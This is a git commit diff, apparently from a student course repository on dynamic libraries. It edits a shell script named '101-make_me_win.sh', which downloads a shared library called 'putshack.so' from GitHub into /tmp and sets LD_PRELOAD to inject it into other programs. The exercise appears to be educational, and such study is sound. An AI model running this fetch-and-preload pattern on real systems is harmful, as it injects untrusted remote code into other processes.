023e3db7aa6b83646558e5557e5543a887a7ec3d
Dan01-M <www.dan56mateo@gmail.com>
2024-04-14 03:09:43 -0700

    dynamic

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/dan01-M/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
+wget -P /tmp https://github.com/Dan01-M/Alxschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
 export LD_PRELOAD=/tmp/putshack.so
